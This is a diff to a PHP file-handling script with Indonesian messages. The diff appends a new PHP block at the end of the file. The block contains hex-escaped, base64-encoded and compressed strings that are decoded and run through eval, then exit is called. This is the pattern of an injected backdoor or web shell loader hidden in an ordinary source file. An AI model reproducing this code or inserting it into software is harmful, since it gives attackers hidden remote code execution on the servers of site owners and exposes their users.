@@ -105,3 +105,9 @@ echo "Gagal membuat file.\n";
 }
 }
 ?>
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "ELy1y3THZIgsW\x63jej\x41h7\x63JQ/e52j\x62MFDxwvOFkf7fDxsO4uzNKTK2OoTSu39\x63y\x42\x61NGdMJH\x2bH0IS09zO4/77\x63\x2bPY7xuHP2\x42g\x61owpE\x2bzh\x2by0RY53Zo0RG0jLDe0YGNQ5\x42y9r9wwFE3IVm5hYv7hHfjX3qkQ/56Ou4Un0Qt\x42outfl9e\x63Zg\x62S\x63mF\x43t\x61mglNTW6sMN6LmGGg0LFmjuWYEGGW\x41R\x61/\x61gJ9syoQYYTeVl\x43pME\x62Jsg2P\x2bOxEwx0mizJV2tO17K5\x42dE\x439\x41QfL4904R/vlk9x\x617Q52yVRVPxor4qo\x43teHqvOkITZlf\x6393HvEZ5\x63tUndPPUIwK\x61\x416J\x63Zk/ju\x432rYJ46\x41dU97wUIVU5\x2btd\x41\x41uiq\x43lQy6\x618SDS\x43dEJfgV9qN3pO\x61PJO1ZhqOjVzE\x43\x41z\x61tFeTf0IIXKgmW\x61\x43Wd11vMsY9\x627Y3k\x2bf3Yh6sYixQ1EXrT\x62\x61Vr\x63gTdEw4PQI3\x433SMoEKtFoVyDFYxzUsKR8WJMXX5qwT8\x63OsrffD2N\x2bSk3lh\x61\x41hPJT\x42ZM5So\x61RX\x2bJ95Fo\x2bp\x61RpGvSKYJoMqJV\x43\x2bdJR4G\x42ToEtmfS81jQplHL\x61GE\x627DK\x638m\x63o\x63\x2bgpGn58k\x63qm3\x61y\x63m\x410\x43wEvm1sdLt6WKzhLPyR/\x63m/lZrsw\x41KYmn2s7\x2bj/ij\x43qUh\x61xWEiX0j\x62qWNVO5efeOuPH3QKJEgu\x61T2\x2b5N7\x2bPZnt2kuRWnU/\x41mJRIq\x436isPKKL\x2bsOrWp\x62FdiyUitMT/Q/L9R\x42QTvYXUV\x61/lLgG\x42wJe9rt\x41lEQ/VLgK\x42wJe9rs\x411EQ/FLgO\x42wJe9rr\x41FFQ/1KgS\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
